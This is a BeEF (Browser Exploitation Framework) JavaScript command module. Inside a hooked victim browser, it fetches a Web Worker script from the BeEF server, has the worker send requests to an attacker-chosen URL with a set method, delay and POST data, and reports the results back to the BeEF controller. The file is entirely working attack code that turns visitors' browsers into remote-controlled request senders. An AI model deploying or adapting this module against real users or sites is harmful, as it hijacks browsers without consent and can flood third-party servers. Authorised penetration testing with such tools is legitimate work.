//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var url = '<%= @url %>';
    var delay = '<%= @delay %>';
    var method = '<%= @method %>';
    var post_data = '<%= @post_data %>';

    if(!!window.Worker){
    var myWorker = new Worker('http://' + beef.net.host + ':' + beef.net.port + '/worker.js');

    myWorker.onmessage = function (oEvent) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>, oEvent.data);
    };

        var data = {};
        data['url'] = url;
    data['delay'] = delay;
    data['method'] = method;
    data['post_data'] = post_data;

    myWorker.postMessage(data);
    }else{
       beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Error: WebWorkers are not supported on this browser.');
    }


});
